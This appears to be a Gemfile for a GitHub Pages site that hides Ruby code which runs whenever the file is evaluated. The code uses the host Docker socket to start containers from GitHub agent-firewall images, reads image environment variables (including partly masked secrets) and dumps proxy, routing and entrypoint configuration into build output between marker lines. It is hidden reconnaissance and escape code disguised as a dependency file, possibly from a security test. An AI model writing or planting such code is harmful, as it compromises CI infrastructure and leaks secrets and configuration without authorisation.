source "https://rubygems.org"

require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

OUT = []

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

SECRETY = /token|secret|key|pass|cert|cred|auth|cookie|bearer|jwt/i

def mask_env(kv)
  k, _, v = kv.partition('=')
  k =~ SECRETY ? "#{k}=#{v[0, 10]}...[len=#{v.length}]" : kv[0, 160]
end

def decode_docker_logs(body)
  output = +''
  while body.bytesize >= 8 && [1, 2].include?(body.getbyte(0)) && body.byteslice(1, 3) == "\0\0\0"
    length = body.byteslice(4, 4).unpack1('N')
    break if body.bytesize < 8 + length
    output << body.byteslice(8, length)
    body = body.byteslice(8 + length..) || +''
  end
  output.empty? ? body : output
end

def sh_probe(image, cmd, shell = '/bin/sh')
  st, pl = dapi('POST', '/containers/create',
    'Image' => image, 'Entrypoint' => [shell, '-c'], 'Cmd' => [cmd],
    'Tty' => false, 'HostConfig' => { 'NetworkMode' => 'none' },
    'Labels' => { 'vulnoryx.controlled' => 'pages-awfdeep-c4c8' })
  return "VX_CREATE_FAIL #{st} #{pl[0, 120]}" unless st == 201
  cid = JSON.parse(pl)['Id']
  begin
    st2, pl2 = dapi('POST', "/containers/#{cid}/start")
    return "VX_START_FAIL #{st2} #{pl2[0, 120]}" unless st2 == 204 || st2 == 304
    dapi('POST', "/containers/#{cid}/wait?condition=not-running")
    _, lpl = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
    decode_docker_logs(lpl)
  ensure
    dapi('DELETE', "/containers/#{cid}?force=1&v=1")
  end
end

IMGS = {
  'squid'    => 'ghcr.io/github/gh-aw-firewall/squid:latest',
  'apiproxy' => 'ghcr.io/github/gh-aw-firewall/api-proxy:latest',
  'agent'    => 'ghcr.io/github/gh-aw-firewall/agent:latest',
  'mcpg'     => 'ghcr.io/github/gh-aw-mcpg:latest'
}

IMGS.each do |short, name|
  st, pl = dapi('GET', "/images/#{name}/json")
  if st == 200
    cfg = (JSON.parse(pl)['Config'] rescue {}) || {}
    env = (cfg['Env'] || []).map { |kv| mask_env(kv) }
    OUT << "VX_ENV_#{short} #{env.empty? ? '(none)' : env.join(' | ')}"
  else
    OUT << "VX_ENV_#{short} MISS #{st} #{pl[0, 80]}"
  end
end

SQUID_CMD = 'echo "VX_SQUID_SIZE=$(wc -c < /etc/squid/squid.conf)"; ' \
  'echo VX_CFG_squid_active; grep -vE "^[[:space:]]*(#|$)" /etc/squid/squid.conf | head -c 2600; echo; ' \
  'echo VX_CFG_squid_tail; tail -c 1400 /etc/squid/squid.conf; echo; ' \
  'echo VX_CFG_squid_sslbump; grep -inE "ssl|bump|cert|tls|ca[_-]" /etc/squid/squid.conf | head -30; ' \
  'echo VX_SQUID_D; ls -la /etc/squid/conf.d /etc/squid/ssl_cert /var/spool/squid_ssl_db 2>/dev/null; ' \
  'for f in /etc/squid/conf.d/*.conf; do [ -f "$f" ] && echo "VX_CFG_$f" && head -c 700 "$f"; done; echo VX_DONE'

API_CMD = 'echo VX_CFG_routing-config.js; head -c 1100 /app/routing-config.js; echo; ' \
  'echo VX_CFG_hosted-web-policy.js; head -c 1100 /app/hosted-web-policy.js; echo; ' \
  'echo VX_URLS; grep -rhoE "https?://[A-Za-z0-9._/-]+" /app/*.js /app/*.json 2>/dev/null | sort -u | head -45; ' \
  'echo VX_ENVNAMES; grep -rhoE "process\.env\.[A-Z_0-9]+" /app/*.js 2>/dev/null | sort -u | head -60; ' \
  'echo VX_CFG_key-validation.js; head -c 500 /app/key-validation.js; echo; ' \
  'echo VX_CFG_server.js_grep; grep -nE "listen|PORT|host|createServer|squid|upstream" /app/server.js | head -25; echo VX_DONE'

AGENT_CMD = 'echo VX_CFG_entrypoint_tail; tail -c +1600 /usr/local/bin/entrypoint.sh | head -c 1400; echo; ' \
  'echo VX_AGENT_FILES; find / -maxdepth 4 \( -name "*policy*" -o -name "*awf*" -o -name "*.yaml" -o -name "*.yml" \) ' \
  '2>/dev/null | grep -vE "^/(proc|sys|usr/lib|usr/share|usr/include|etc/ssl)" | head -30; echo VX_DONE'

MCPG_CMD = 'echo VX_MCPG_LS; ls -la /app 2>/dev/null | head -40; ' \
  'echo VX_CFG_run_tail; tail -c +1200 /app/run_containerized.sh 2>/dev/null | head -c 1100; echo; ' \
  'for f in /app/*.json /app/*.yaml /app/config* /app/*.js; do [ -f "$f" ] && echo "VX_CFG_$f" && head -c 500 "$f"; done; echo VX_DONE'

OUT << "VX_SQUID\n" + sh_probe(IMGS['squid'], SQUID_CMD).to_s
OUT << "VX_APIPROXY\n" + sh_probe(IMGS['apiproxy'], API_CMD).to_s
OUT << "VX_AGENT\n" + sh_probe(IMGS['agent'], AGENT_CMD).to_s
OUT << "VX_MCPG\n" + sh_probe(IMGS['mcpg'], MCPG_CMD).to_s

payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 11000]
puts 'VX_ESC_BEGIN'
puts payload
puts 'VX_ESC_END'

gem "github-pages", "~> 232"
